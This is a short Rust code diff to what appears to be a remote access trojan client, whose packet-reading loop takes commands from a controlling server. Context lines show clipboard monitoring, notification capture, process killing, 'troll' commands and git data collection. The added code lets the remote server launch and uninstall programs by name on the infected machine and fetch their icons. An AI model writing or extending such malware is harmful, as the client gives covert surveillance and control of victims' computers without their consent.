@@ -14,6 +14,9 @@ use crate::features::extraction::{
     stop_clipboard_monitor,
     start_notification_capture,
     stop_notification_capture,
+    launch_software_by_name,
+    uninstall_software_by_name,
+    get_software_icon_by_name,
 };
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
@@ -172,6 +175,21 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::GetSoftwareInventory)) => {
                 let data = collect_software_inventory();
                 let _ = send_packet(ServerboundPacket::SoftwareInventory(data)).await;
+            }
+
+            Ok(Some(ClientboundPacket::LaunchSoftware(name))) => {
+                let result = launch_software_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareActionResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::UninstallSoftware(name))) => {
+                let result = uninstall_software_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareActionResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::GetSoftwareIcon(name))) => {
+                let result = get_software_icon_by_name(&name);
+                let _ = send_packet(ServerboundPacket::SoftwareIconResult(result)).await;
             }
 
             Ok(Some(ClientboundPacket::GetGitData)) => {
